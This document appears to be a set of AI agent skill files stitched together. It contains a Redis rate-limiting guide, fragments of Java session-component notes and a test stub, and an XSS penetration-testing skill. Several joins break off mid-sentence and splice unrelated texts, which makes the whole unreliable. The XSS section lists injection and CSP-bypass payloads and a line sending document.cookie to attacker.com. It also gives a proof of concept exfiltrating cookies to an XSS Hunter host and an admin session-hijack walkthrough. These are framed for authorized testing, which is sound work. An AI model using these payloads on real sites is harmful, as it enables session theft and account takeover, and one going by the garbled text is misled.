Combine with authentication, authorization, and WAF rules.\n\n## Prerequisites\n\n- Redis 6.0+ for distributed rate limit counters (or in-memory for single-instance deployments)\n- API framework (Express.js, FastAPI, Spring Boot, or Django REST Framework)\n- Monitoring system for rate limit metrics (Prometheus, CloudWatch, Datadog)\n- Understanding of the API's normal traffic patterns and peak usage\n- Load testing tool (k6, Gatling, or Locust) for validating rate limit behavior\n\n## Workflow\n\n### Step 1: Rate Limiting Strategy Design\n\nDefine rate limits per endpoint category and user tier:\n\n```python\n# Rate limit configuration\nRATE_LIMITS = {\n    # Authentication endpoints (most restrictive)\n    \"auth\": {\n        \"login\": {\"requests\": 5, \"window_seconds\": 60, \"by\": \"ip\"},\n        \"register\": {\"requests\": 3, \"window_seconds\": 300, \"by\": \"ip\"},\n        \"forgot_password\": {\"requests\": 3, \"window_seconds\": 3600, \"by\": \"ip\"},\n        \"verify_mfa\": {\"requests\": 5, \"window_seconds\": 300, \"by\": \"user\"},\n    },\n    # Standard API endpoints\n    \"api\": {\n        \"free\": {\"requests\": 60, \"window_seconds\": 60, \"by\": \"user\"},\n        \"premium\": {\"requests\": 300, \"window_seconds\": 60, \"by\": \"user\"},\n        \"enterprise\": {\"requests\": 1000, \"window_seconds\": 60, \"by\": \"user\"},\n    },\n    # Resource-intensive endpoints\n    \"expensive\": {\n        \"search\": {\"requests\": 10, \"window_seconds\": 60, \"by\": \"user\"},\n        \"export\": {\"requests\": 5, \"window_seconds\": 3600, \"by\": \"user\"},\n        \"bulk_import\": {\"requests\": 2, \"window_seconds\": 3600, \"by\": \"user\"},\n    },\n    # Global limits\n    \"global\": {\n        \"per_ip\": {\"requests\": 1000, \"window_seconds\": 60, \"by\": \"ip\"},\n        \"per_user\": {\"requests\": 5000, \"window_seconds\": 3600, \"by\": \"user\"},\n    },\n}\n```\n\n### Step 2: Sliding Window Rate Limiter (Redis)\n\n```python\nimport redis\nimport time\nimport hashlib\nfrom functools import wraps\nfrom flask import Flask, request, jsonify, g\n\napp = Flask(__name__)\nredis_client = redis.Redis(host='localhost', port=6379, db=0, decode_responses=True)\n\nclass SlidingWindowRateLimiter:\n    \"\"\"Sliding window rate limiter using Redis sorted sets.\"\"\"\n\n    def __init__(self, redis_conn):\n        self.redis = redis_conn\n\n    def is_allowed(self, key, max_requests, window_seconds):\n        \"\"\"Check if request is allowed and record it.\"\"\"\n        now = time.time()\n        window_start = now - window_seconds\n        pipe = self.redis.pipeline()\n\n        # Remove expired entries\n        pipe.zremrangebyscore(key, 0, window_start)\n        # Count requests in current window\n        pipe.zcard(key)\n        # Add current request\n        pipe.zadd(key, {f\"{now}:{hashlib.md5(str(now).encode()).hexdigest()[:8]}\": now})\n        # Set TTL on the key\n        pipe.expire(key, window_seconds + 1)\n\n        results = pipe.execute()\n        current_count = results[1]\n\n        if current_count >= max_requests:\n            # Calculate retry-after\n            oldest = self.redis.zrange(key, 0, 0, withscores=True)\n            if oldest:\n                retry_after = int(oldest[0][1] + window_seconds - now) + 1\n            else:\n                retry_after = window_seconds\n            return False, current_count, max_requests, retry_after\n\n        return True, current_count + 1, max_requests, 0\n\nrate_limiter = SlidingWindowRateLimiter(redis_client)\n\ndef rate_limit(max_requests, window_seconds, key_func=None):\n    \"\"\"Decorator for rate limiting API endpoints.\"\"\"\n    def decorator(f):\n        @wraps(f)\n        def wrapped(*args, **kwargs):\n            # Determine the rate limit key\n            if key_func:\n                identifier = key_func()\n            elif hasattr(g, 'user_id'):\n                identifier = f\"user:{g.user_id}\"\n            else:\n                identifier = f\"ip:{request.remote_addr}\"\n\n            key = f\"ratelimit:{request.endpoint}:{identifier}\"\n            allowed, current, limit, retry_after = rate_limiter.is_allowed(\n                key, max_requests, window_seconds)\n\n            # Always set rate limit headers\n            headers = {\n                \"X-RateLimit-Limit\": str(limit),\n                \"X-RateLimit-Remaining\": str(max(0, limit - current)),\n                \"X-RateLimit-Reset\": str(int(time.time()) + window_seconds),\n            }\n\n            if not allowed:\n                headers[\"Retry-After\"] = str(retry_after)\n                response = jsonify({\n                    \"error\": \"rate_limit_exceeded\",\n                    \"message\": \"Too many requests. Please try again later.\",\n                    \"retry_after\": retry_after\n                })\n                response.status_code = 429\n                for h, v in headers.items():\n                    response.headers[h] = v\n                return response\n\n            response = f(*args, **kwargs)\n            for h, v in headers.items():\n                response.headers[h] = v\n            return response\n        return wrapped\n    return decorator\n\n# Apply rate limiting to endpoints\n@app.route('/api/v1/auth/login', methods=['POST'])\n@rate_limit(max_requests=5, window_seconds=60,\n            key_func=lambda: f\"ip:{request.remote_addr}\")\ndef login():\n    # Login logic\n    return jsonify({\"message\": \"Login successful\"})\n\n@app.route('/api/v1/users/me', methods=['GET'])\n@rate_limit(max_requests=60, window_seconds=60)\ndef get_profile():\n    # Profile logic\n    return jsonify({\"user\": \"data\"})\n\n@app.route('/api/v1/search', methods=['GET'])\n@rate_limit(max_requests=10, window_seconds=60)\ndef search():\n    # Search logic\n    return jsonify({\"results\": []})\n```\n\n### Step 3: Token Bucket Rate Limiter\n\n```python\nimport redis\nimport time\n\nclass TokenBucketRateLimiter:\n    \"\"\"Token bucket rate limiter allowing burst traffic within limits.\"\"\"\n\n    def __init__(self, redis_conn):\n        self.redis = redis_conn\n\n    def is_allowed(self, key, max_tokens, refill_rate, refill_interval=1):\n        \"\"\"\n        Token bucket algorithm:\n        - max_tokens: Maximum burst capacity\n        - refill_rate: Tokens added per refill_interval\n        - refill_interval: Seconds between refills\n        \"\"\"\n        now = time.time()\n        bucket_key = f\"tb:{key}\"\n\n        # Lua script for atomic token bucket operation\n        lua_script = \"\"\"\n        local key = KEYS[1]\n        local max_tokens = tonumber(ARGV[1])\n        local refill_rate = tonumber(ARGV[2])\n        local refill_interval = tonumber(ARGV[3])\n        local now = tonumber(ARGV[4])\n\n        local bucket = redis.call('hmget', key, 'tokens', 'last_refill')\n        local tokens = tonumber(bucket[1])\n        local last_refill = tonumber(bucket[2])\n\n        if tokens == nil then\n            tokens = max_tokens\n            last_refill = now\n        end\n\n        -- Refill tokens\n        local elapsed = now - last_refill\n        local refills = math.floor(elapsed / refill_interval)\n        if refills > 0 then\n            tokens = math.min(max_tokens, tokens + (refills * refill_rate))\n            last_refill = last_refill + (refills * refill_interval)\n        end\n\n        local allowed = 0\n        if tokens >= 1 then\n            tokens = tokens - 1\n            allowed = 1\n        end\n\n        redis.call('hmset', key, 'tokens', tokens, 'last_refill', last_refill)\n        redis.call('expire', key, math.ceil(max_tokens / refill_rate * refill_interval) + 10)\n\n        return {allowed, tokens, max_tokens}\n        \"\"\"\n\n        result = self.redis.eval(lua_script, 1, bucket_key,\n                                  max_tokens, refill_rate, refill_interval, now)\n        allowed = bool(result[0])\n        remaining = int(result[1])\n        limit = int(result[2])\n\n        return allowed, remaining, limit\n```\n\n### Step 4: Tiered Rate Limiting with User Plans\n\n```python\nfrom enum import Enum\n\nclass UserTier(Enum):\n    FREE = \"free\"\n    PREMIUM = \"premium\"\n    ENTERPRISE = \"enterprise\"\n\nTIER_LIMITS = {\n    UserTier.FREE: {\n        \"default\": (60, 60),          # 60 req/min\n        \"search\": (10, 60),           # 10 req/min\n        \"export\": (5, 3600),          # 5 req/hour\n        \"daily_total\": (1000, 86400), # 1000 req/day\n    },\n    UserTier.PREMIUM: {\n        \"default\": (300, 60),\n        \"search\": (50, 60),\n        \"export\": (20, 3600),\n        \"daily_total\": (10000, 86400),\n    },\n    UserTier.ENTERPRISE: {\n        \"default\": (1000, 60),\n        \"search\": (200, 60),\n        \"export\": (100, 3600),\n        \"daily_total\": (100000, 86400),\n    },\n}\n\ndef get_rate_limit_for_request(user_tier, endpoint_category=\"default\"):\n    \"\"\"Get rate limit configuration based on user tier and endpoint.\"\"\"\n    tier_config = TIER_LIMITS.get(user_tier, TIER_LIMITS[UserTier.FREE])\n    limit_config = tier_config.get(endpoint_category, tier_config[\"default\"])\n    return limit_config  # (max_requests, window_seconds)\n\nclass TieredRateLimitMiddleware:\n    \"\"\"Middleware that applies rate limits based on user subscription tier.\"\"\"\n\n    def __init__(self, app, redis_conn):\n        self.app = app\n        self.limiter = SlidingWindowRateLimiter(redis_conn)\n\n    def __call__(self, environ, start_response):\n        # Extract user info from request\n        user_id = environ.get(\"HTTP_X_USER_ID\")\n        user_tier = UserTier(environ.get(\"HTTP_X_USER_TIER\", \"free\"))\n        endpoint = environ.get(\"PATH_INFO\", \"/\")\n\n        # Determine endpoint category\n        category = \"default\"\n        if \"/search\" in endpoint:\n            category = \"search\"\n        elif \"/export\" in endpoint:\n            category = \"export\"\n\n        max_requests, window = get_rate_limit_for_request(user_tier, category)\n        key = f\"tiered:{user_id or environ.get('REMOTE_ADDR')}:{category}\"\n\n        allowed, current, limit, retry_after = self.limiter.is_allowed(\n            key, max_requests, window)\n\n        if not allowed:\n            status = \"429 Too Many Requests\"\n            headers = [\n                (\"Content-Type\", \"application/json\"),\n                (\"Retry-After\", str(retry_after)),\n                (\"X-RateLimit-Limit\", str(limit)),\n                (\"X-RateLimit-Remaining\", \"0\"),\n            ]\n            start_response(status, headers)\n            body = f'{{\"error\":\"rate_limit_exceeded\",\"retry_after\":{retry_after},\"tier\":\"{user_tier.value}\"}}'\n            return [body.encode()]\n\n        return self.app(environ, start_response)\n```\n\n### Step 5: Distributed Rate Limiting for Microservices\n\n```python\n# Centralized rate limiting service using Redis Cluster\nimport redis\nfrom redis.cluster import RedisCluster\n\nclass DistributedRateLimiter:\n    \"\"\"Rate limiter for microservice architectures using Redis Cluster.\"\"\"\n\n    def __init__(self):\n        self.redis = RedisCluster(\n            startup_nodes=[\n                {\"host\": \"redis-node-1\", \"port\": 6379},\n                {\"host\": \"redis-node-2\", \"port\": 6379},\n                {\"host\": \"redis-node-3\", \"port\": 6379},\n            ],\n            decode_responses=True\n        )\n\n    def check_and_increment(self, service_name, user_id, endpoint,\n                             max_requests, window_seconds):\n        \"\"\"Atomic check-and-increment using Redis Lua script.\"\"\"\n        key = f\"rl:{{{service_name}}}:{user_id}:{endpoint}\"\n\n        # Lua script ensures atomicity across the check and increment\n        lua_script = \"\"\"\n        local key = KEYS[1]\n        local max_requests = tonumber(ARGV[1])\n        local window = tonumber(ARGV[2])\n        local now = tonumber(ARGV[3])\n        local window_start = now - window\n\n        -- Remove old entries\n        redis.call('zremrangebyscore', key, '-inf', window_start)\n\n        -- Count current entries\n        local count = redis.call('zcard', key)\n\n        if count >= max_requests then\n            -- Get oldest entry for retry-after calculation\n            local oldest = redis.call('zrange', key, 0, 0, 'WITHSCORES')\n            local retry_after = 0\n            if #oldest > 0 then\n                retry_after = math.ceil(tonumber(oldest[2]) + window - now)\n            end\n            return {0, count, retry_after}\n        end\n\n        -- Add new entry\n        redis.call('zadd', key, now, now .. ':' .. math.random(100000))\n        redis.call('expire', key, window + 1)\n\n        return {1, count + 1, 0}\n        \"\"\"\n\n        result = self.redis.eval(lua_script, 1, key,\n                                  max_requests, window_seconds, time.time())\n        return {\n            \"allowed\": bool(result[0]),\n            \"current\": int(result[1]),\n            \"retry_after\": int(result[2]),\n        }\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Sliding Window** | Rate limiting algorithm that tracks requests in a rolling time window, providing smoother rate enforcement than fixed windows |\n| **Token Bucket** | Algorithm where tokens are added at a fixed rate and consumed per request, allowing controlled bursts up to the bucket capacity |\n| **Fixed Window** | Simplest rate limiting where requests are counted per fixed time window (e.g., per minute), susceptible to burst at window boundaries |\n| **429 Too Many Requests** | HTTP status code indicating the client has exceeded the rate limit, accompanied by Retry-After header |\n| **Retry-After Header** | HTTP response header telling the client how many seconds to wait before retrying, essential for well-behaved API clients |\n| **Distributed Rate Limiting** | Rate limiting across multiple server instances using shared state (Redis, Memcached) to maintain accurate global counters |\n\n## Tools & Systems\n\n- **Redis**: In-memory data store used for distributed rate limit counters with atomic operations via Lua scripts\n- **Kong Rate Limiting Plugin**: API gateway plugin supporting fixed-window and sliding-window rate limiting with Redis backend\n- **express-rate-limit**: Express.js middleware for simple rate limiting with Redis, Memcached, or in-memory stores\n- **Flask-Limiter**: Flask extension for rate limiting with support for multiple backends and configurable limits per endpoint\n- **Envoy Rate Limit Service**: Centralized rate limiting service for Envoy-based service mesh architectures\n\n## Common Scenarios\n\n### Scenario: Implementing Rate Limiting for a Public API\n\n**Context**: A company launches a public API with free, premium, and enterprise tiers. The API must protect against abuse while providing fair access to paying customers. The API runs on 6 instances behind an AWS ALB.\n\n**Approach**:\n1. Deploy Redis Cluster (3 nodes) for distributed rate limit state\n2. Implement sliding window rate limiter using Redis sorted sets with Lua scripts for atomicity\n3. Configure per-tier limits: Free (60 req/min), Premium (300 req/min), Enterprise (1000 req/min)\n4. Add stricter limits on authentication endpoints (5 req/min per IP) regardless of tier\n5. Implement resource-intensive endpoint limits (search: 10 req/min free, export: 5 req/hour)\n6. Set rate limit response headers on every response (X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset)\n7. Return 429 with Retry-After header and JSON error body when limits are exceeded\n8. Set up Prometheus metrics for rate limit hits and CloudWatch alarms for unusual patterns\n\n**Pitfalls**:\n- Using in-memory rate limiting without shared state across instances, allowing limit bypass by hitting different servers\n- Not implementing rate limiting on authentication endpoints separately from general API limits\n- Using fixed windows that allow burst at window boundaries (2x the limit in a short period)\n- Not including rate limit headers on successful responses, giving clients no visibility into their quota\n- Trusting X-Forwarded-For for IP identification without validating it against the load balancer\n\n## Output Format\n\n```\n## Rate Limiting Implementation Report\n\n**API**: Public API v2\n**Algorithm**: Sliding Window (Redis Sorted Sets)\n**Backend**: Redis Cluster (3 nodes)\n**Deployment**: 6 API instances behind AWS ALB\n\n### Rate Limit Configuration\n\n| Tier | Default | Search | Export | Auth (per IP) |\n|------|---------|--------|--------|---------------|\n| Free | 60/min | 10/min | 5/hour | 5/min |\n| Premium | 300/min | 50/min | 20/hour | 5/min |\n| Enterprise | 1000/min | 200/min | 100/hour | 10/min |\n\n### Validation Results (k6 load test)\n\n- Free tier: Rate limited at 61st request (correct)\n- Premium tier: Rate limited at 301st request (correct)\n- Cross-instance: Rate limiting consistent across all 6 instances\n- Redis failover: Rate limiting degrades gracefully (allows traffic) when Redis is unreachable\n- Retry-After header: Accurate within 1 second of actual reset time\n- Response overhead: < 2ms added latency per request for rate limit check\n```\n/root/.codex/skills/implementing-api-rate-limiting-and-throttling/references/api-reference.md\n# API Reference: Implementing API Rate Limiting and Throttling\n\n## Token Bucket Algorithm\n\n```python\nimport time\nclass TokenBucket:\n    def __init__(self, capacity, refill_rate):\n        self.capacity = capacity\n        self.tokens = capacity\n        self.refill_rate = refill_rate  # tokens/sec\n        self.last_refill = time.time()\n\n    def allow(self):\n        now = time.time()\n        self.tokens = min(self.capacity,\n            self.tokens + (now - self.last_refill) * self.refill_rate)\n        self.last_refill = now\n        if self.tokens >= 1:\n            self.tokens -= 1\n            return True\n        return False\n```\n\n## Redis Sliding Window\n\n```python\nimport redis, time\nr = redis.Redis()\ndef check_rate(client_id, window=60, limit=100):\n    key = f\"rl:{client_id}\"\n    now = time.time()\n    pipe = r.pipeline()\n    pipe.zremrangebyscore(key, 0, now - window)\n    pipe.zadd(key, {str(now): now})\n    pipe.zcard(key)\n    pipe.expire(key, window)\n    _, _, count, _ = pipe.execute()\n    return count <= limit\n```\n\n## HTTP 429 Response Headers\n\n| Header | Value | Description |\n|--------|-------|-------------|\n| `Retry-After` | `30` | Seconds until retry |\n| `X-RateLimit-Limit` | `100` | Max requests |\n| `X-RateLimit-Remaining` | `0` | Remaining requests |\n| `X-RateLimit-Reset` | epoch | Reset timestamp |\n\n## Kong Rate Limiting Plugin\n\n```bash\ncurl -X POST Moving it after would save a throttled request the work —\n  and turn \"you are throttled\" into a cheap probe, because the fast refusal would then be\n  distinguishable from a grant by timing alone. The extra 59 µs of padding a refusal pays is the point.\n- A HEAD request consumes handoff allowance exactly as a GET does. Allowing HEAD for free would make\n  it a way to test whether a session is grantable without spending a grant, which is the outcome the\n  throttle exists to prevent.\n- `ADDR-allowlist` is the one mutant reported `equivalent` rather than killed. The character allowlist\n  is a strict superset of what the two grammars accept — it admits only `[0-9A-Fa-f:.]`, which is\n  exactly what dotted-quad and RFC 4291 need — so no string can exist that the loop refuses and the\n  grammars accept. Manufacturing a kill would mean writing an assertion that fails for a reason\n  unrelated to the mutant; the sweep turns that claim into a measurement with an expiry date.\n\n## Known limitations\n\n- Rule 4's residual risk (a fooled authenticator) is documented above and is not fixable here.\n- \"Clear credentials from memory\" is bounded by what a JVM can do with an immutable `String`\n  ([rule 5](#5-sensitive-data-masked-bounded-private-and-cleared-from-memory)).\n- The rate limiter is per JVM. Behind N instances the effective allowance is N × the configured\n  numbers; the global ceiling is a per-process circuit breaker, not a cluster-wide one. Sharing state\n  would mean a cache, which means a new trust boundary and a new failure mode — deliberately out of\n  scope for a cookie-writing component.\n- `429` vs `403` is the one distinction kept between refusal families (availability vs\n  authentication). Collapsing them would remove a signal an operator needs; the body and the headers\n  are identical either way, so it discloses nothing about the session.\n- No SameSite setter exists in Servlet 6.0 (`Cookie#setAttribute` is used and Tomcat 10.1 renders it),\n  and `SC_TOO_MANY_REQUESTS` only arrives in 6.1 — hence local constants. Both are noted in the code\n  where they matter.\n---\nname: testing-for-xss-vulnerabilities\ndescription: Tests web applications for reflected, stored, and DOM-based Cross-Site\n  Scripting by injecting JavaScript payloads with Burp Suite (XSS extensions, Active\n  Scan++) and browser tools, then bypassing sanitization and CSP to demonstrate session\n  hijacking and user impersonation. Use for OWASP WSTG client-side injection testing or\n  when evaluating input sanitization and output encoding coverage.\ndomain: cybersecurity\nsubdomain: penetration-testing\ntags:\n- XSS\n- cross-site-scripting\n- client-side-security\n- OWASP-A03\n- JavaScript-injection\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- ID.RA-01\n- ID.RA-06\n- GV.OV-02\n- DE.AE-07\nmitre_attack:\n- T1595\n- T1190\n- T1059\n- T1078\n- T1055\n---\n# Testing for XSS Vulnerabilities\n\n## When to Use\n\n- Testing web applications for client-side injection vulnerabilities as part of OWASP WSTG testing\n- Evaluating the effectiveness of input sanitization and output encoding across all application features\n- Assessing the protection provided by Content Security Policy (CSP) headers against XSS exploitation\n- Demonstrating the impact of XSS through session hijacking, credential theft, or phishing overlay to stakeholders\n- Testing single-page applications (React, Angular, Vue) for DOM-based XSS in client-side routing and rendering\n\n**Do not use** against applications without written authorization, for deploying persistent XSS payloads that affect real users, or for exfiltrating actual user session tokens from production environments.\n\n## Prerequisites\n\n- Authorized scope defining the target web application and acceptable testing activities\n- Burp Suite Professional with XSS-focused extensions (XSS Validator, Reflector, Active Scan++)\n- Browser with developer tools and XSS testing extensions (HackBar, XSS Hunter)\n- XSS Hunter or Burp Collaborator for out-of-band payload verification\n- SecLists XSS payload lists and custom payloads for WAF bypass scenarios\n\n\n> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.\n\n## Workflow\n\n### Step 1: Input and Output Mapping\n\nMap every location where user input enters and is rendered by the application:\n\n- **Reflected inputs**: Test every URL parameter, search field, error message, and HTTP header value that is reflected in the response\n- **Stored inputs**: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages\n- **DOM inputs**: Identify client-side JavaScript that reads from `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, or `localStorage` and writes to the DOM\n- **Output context identification**: For each reflected input, determine the rendering context:\n  - HTML body: `<div>USER_INPUT</div>`\n  - HTML attribute: `<input value=\"USER_INPUT\">`\n  - JavaScript string: `var x = 'USER_INPUT';`\n  - URL context: `<a href=\"USER_INPUT\">`\n  - CSS context: `<div style=\"color: USER_INPUT\">`\n\n### Step 2: Reflected XSS Testing\n\nTest reflected injection points with context-appropriate payloads:\n\n- **HTML body context**: `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`\n- **HTML attribute context**: `\" onfocus=alert(1) autofocus=\"`, `\" onmouseover=alert(1) \"`, `\"><script>alert(1)</script>`\n- **JavaScript string context**: `';alert(1)//`, `\\';alert(1)//`, `</script><script>alert(1)</script>`\n- **URL/href context**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`\n- **Inside HTML comments**: `--><script>alert(1)</script><!--`\n- **Filter bypass payloads** (when basic payloads are blocked):\n  - Case variation: `<ScRiPt>alert(1)</sCrIpT>`\n  - Event handlers: `<details open ontoggle=alert(1)>`\n  - SVG: `<svg><animate onbegin=alert(1) attributeName=x>`\n  - Encoding: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`\n\n### Step 3: Stored XSS Testing\n\nTest persistent storage points that render input to other users:\n\n- Submit XSS payloads to every stored input field identified in Step 1\n- Use a unique identifier in each payload to track which inputs trigger: `<script>alert('XSS-PROFILE-001')</script>`\n- Check all locations where the stored input is rendered (the same input may appear on multiple pages)\n- Test file upload features with HTML files containing JavaScript, SVG files with embedded scripts, and filenames containing XSS payloads\n- Test rich text editors by injecting payloads through the raw HTML mode or by manipulating the POST data after the client-side editor sanitizes\n- Use XSS Hunter payloads (`\"><script src=https://yourxsshunter.xss.ht></script>`) for blind stored XSS where the payload fires in an admin panel or internal tool you cannot directly access\n\n### Step 4: DOM-Based XSS Testing\n\nAnalyze client-side JavaScript for unsafe DOM manipulation:\n\n- **Source identification**: Search JavaScript for dangerous sources that read attacker-controlled input:\n  - `document.location`, `document.URL`, `document.referrer`\n  - `location.hash`, `location.search`, `location.href`\n  - `window.name`, `postMessage` event data\n- **Sink identification**: Search for dangerous sinks that write to the DOM:\n  - `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`\n  - `eval()`, `setTimeout()`, `setInterval()`, `Function()`\n  - `element.setAttribute()` with event handlers, `jQuery.html()`, `.append()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)\n- **Trace data flow**: Follow the path from source to sink. If user-controlled input reaches a dangerous sink without proper sanitization, DOM XSS exists.\n- **Framework-specific testing**: Test React `dangerouslySetInnerHTML`, Angular template injection (`{{constructor.constructor('alert(1)')()}}`), Vue `v-html` directive\n\n### Step 5: CSP Bypass and Advanced Exploitation\n\nTest Content Security Policy effectiveness and demonstrate real-world impact:\n\n- **CSP analysis**: Review the CSP header for weaknesses:\n  - `unsafe-inline` in script-src allows inline scripts\n  - `unsafe-eval` allows eval() and similar functions\n  - Wildcard domains (`*.googleapis.com`) may host JSONP endpoints usable for CSP bypass\n  - `base-uri` not set allows `<base>` tag injection to redirect relative script loads\n- **JSONP bypass**: If CSP allows a domain with JSONP endpoints, use `<script src=\"https://allowed-domain.com/jsonp?callback=alert(1)\"></script>`\n- **Impact demonstration**:\n  - Session hijacking: `<script>new Image().src=\"https://attacker.com/steal?c=\"+document.cookie</script>`\n  - Credential phishing: Inject a fake login form overlay that submits to the attacker's server\n  - Keylogging: Inject JavaScript that captures keystrokes on the page\n  - Account takeover: Use XSS to change the victim's email address and trigger a password reset\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Reflected XSS** | Non-persistent XSS where the injected payload is included in the server's response to the same request, requiring the victim to click a crafted URL |\n| **Stored XSS** | Persistent XSS where the payload is saved on the server and served to other users who view the affected page |\n| **DOM-Based XSS** | XSS that occurs entirely in the browser when client-side JavaScript reads attacker-controlled data and writes it to a dangerous DOM sink |\n| **Content Security Policy** | HTTP response header that restricts which sources the browser can load scripts, styles, and other resources from, providing defense-in-depth against XSS |\n| **Output Encoding** | Converting special characters to their HTML entity equivalents (e.g., `<` to `&lt;`) to prevent the browser from interpreting user input as code |\n| **Sink** | A JavaScript function or DOM property that can cause code execution or HTML rendering if attacker-controlled data reaches it unsanitized |\n\n## Tools & Systems\n\n- **Burp Suite Professional**: HTTP proxy with active scanning for reflected and stored XSS, plus Repeater and Intruder for manual payload testing\n- **XSS Hunter**: Hosted service that generates payloads which phone home with screenshots, cookies, and DOM content when triggered, essential for blind stored XSS\n- **DOMPurify**: Client-side sanitization library used by developers to prevent XSS; testers should test for bypass techniques against the deployed version\n- **Browser Developer Tools**: Console, Network, and Elements tabs for tracing DOM-based XSS data flows and testing payloads in real-time\n\n## Common Scenarios\n\n### Scenario: Stored XSS in Customer Support Ticket System\n\n**Context**: An e-commerce platform has a customer support system where customers submit tickets that are viewed by support agents in an internal admin panel. The ticket submission form accepts HTML formatting.\n\n**Approach**:\n1. Submit a support ticket with a unique XSS Hunter payload in the ticket description\n2. The payload fires when a support agent views the ticket in the admin panel, sending a callback with the agent's session cookie, page DOM, and screenshot\n3. Use the captured admin session cookie to access the admin panel as the support agent\n4. From the admin panel, access customer records, order data, and refund functionality\n5. Document the attack chain: customer submits ticket -> agent views ticket -> XSS fires -> session stolen -> admin panel compromised\n6. Test if CSP would have prevented the attack (in this case, no CSP header was present)\n\n**Pitfalls**:\n- Only testing for `<script>alert(1)</script>` and missing XSS that fires through event handlers or in non-HTML contexts\n- Not testing stored XSS in features that render to administrative users (support tickets, user profiles viewed by admins)\n- Ignoring DOM-based XSS in single-page applications where the server-side code is secure but client-side rendering is vulnerable\n- Not checking for XSS in HTTP headers (Referer, User-Agent) that may be logged and rendered in admin dashboards\n\n## Output Format\n\n```\n## Finding: Stored XSS in Support Ticket Description\n\n**ID**: XSS-002\n**Severity**: High (CVSS 8.1)\n**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)\n**Parameter**: description (POST body)\n**XSS Type**: Stored (persistent)\n\n**Description**:\nThe support ticket description field does not sanitize HTML input before storing\nit in the database. When a support agent views the ticket in the admin panel, the\nunsanitized HTML is rendered in the agent's browser, allowing arbitrary JavaScript\nexecution in the context of the admin application.\n\n**Proof of Concept**:\nSubmitted ticket with payload:\n<img src=x onerror=\"fetch('https://xsshunter.example/callback?c='+document.cookie)\">\n\nThe payload fired when the agent viewed the ticket, exfiltrating the admin session\ncookie to the XSS Hunter server.\n\n**Impact**:\nAn attacker can steal the session tokens of support agents and administrators,\ngaining access to the admin panel with privileges to view customer PII, process\nrefunds, and modify orders. Affects all 23 support agents who view customer tickets.\n\n**Remediation**:\n1. Implement output encoding using a context-aware library (OWASP Java Encoder,\n   DOMPurify for client-side rendering)\n2. Deploy Content Security Policy header:\n   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'\n3. Set HttpOnly flag on session cookies to prevent JavaScript access\n4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)\n```\n/root/.codex/skills/testing-for-xss-vulnerabilities/references/api-reference.md\n# API Reference: Testing for XSS Vulnerabilities\n\n## requests Library for XSS Testing\n\n### Reflection Testing\n```python\nfrom urllib.parse import quote\n# Inject canary to find reflection points\nresp = requests.get(f\"{url}?q={canary}\")\nif canary in resp.text:\n    # Input is reflected - com.acme.portal.testapp;\n     2\t\n     3\timport java.security.SecureRandom;\n     4\timport java.util.ArrayList;\n     5\timport java.util.Base64;\n     6\timport java.util.List;\n     7\timport java.util.Map;\n     8\timport java.util.concurrent.ConcurrentHashMap;\n     9\t\n    10\t/**\n    11\t * The server-side half of the end-to-end test: stands in for the trusted session owner this\n    12\t * component is documented to integrate with.\n    13\t *\n    14\t * <p>It owns two things and nothing else: the set of identifiers that currently exist, and the\n    15\t * mapping from a login ticket to the identifier created for it.\n    16\t *\n    17\t * <p>Identifiers are minted here, by this stand-in component, with its own {@link SecureRandom} and\n    18\t * its own base64url encoding. That is deliberate twice over: the real trusted owner would hold its\n    19\t * own generator, and {@code SessionId#value()} is package private in the component under test, so\n    20\t * this scaffolding proves from the outside that the sealed accessor really is unobtainable. It also\n    21\t * proves the component accepts an identifier produced by an independent generator, which is the\n    22\t * integration it documents.\n    23\t *\n    24\t * <p>A client can neither choose nor predict one of these values. The end-to-end assertions\n    25\t * deliberately try to.\n    26\t */\n    27\tpublic final class StubSessionStore {\n    28\t\n    29\t    private static final SecureRandom RANDOM = new SecureRandom();\n    30\t    private static final Map<String, Boolean> LIVE = new ConcurrentHashMap<String, Boolean>();\n    31\t    private static final Map<String, String> TICKETS = new ConcurrentHashMap<String, String>();\n    32\t\n    33\t    /** Insertion order, guarded by the class lock. Only {@link #expireOldest()} reads it. */\n    34\t    private static final List<String> CREATION_ORDER = new ArrayList<String>();\n    35\t\n    36\t    private StubSessionStore() {\n    37\t    }\n    38\t\n    39\t    /** Simulates a successful sign-in: mints an identifier and records it as live. */\n    40\t    public static synchronized String loginAndCreateSession(String ticket) {\n    41\t        byte[] material = new byte[32];\n    42\t        RANDOM.nextBytes(material);\n    43\t        String sessionId = Base64.getUrlEncoder().withoutPadding().encodeToString(material);\n    44\t        LIVE.put(sessionId, Boolean.TRUE);\n    45\t        CREATION_ORDER.add(sessionId);\n    46\t        if (ticket != null && !ticket.isEmpty()) {\n    47\t            TICKETS.put(ticket, sessionId);\n    48\t        }\n    49\t        return sessionId;\n    50\t    }\n    51\t\n    52\t    /** Redeems a ticket for its session, leaving the ticket valid; a real one would be consumed. */\n    53\t    public static String sessionForTicket(String ticket) {\n    54\t        return ticket == null ? null : TICKETS.get(ticket);\n    55\t    }\n    56\t\n    57\t    public static boolean isLive(String sessionId) {\n    58\t        return sessionId != null && Boolean.TRUE.equals(LIVE.get(sessionId));\n    59\t    }\n    60\t\n    61\t    /** Test-only: makes an identifier unknown, to exercise the \"store does not confirm\" path. */\n    62\t    public static void expire(String sessionId) {\n    63\t        if (sessionId != null) {\n    64\t            LIVE.remove(sessionId);\n    65\t        }\n    66\t    }\n    67\t\n    68\t    /**\n    69\t     * Expires the oldest session that is still live and reports whether one was dropped. The\n    70\t     * end-to-end script uses this to re-run an identical request and watch a grant turn into a\n    71\t     * refusal, and \"oldest still live\" is the one session the script can name without an identifier:\n    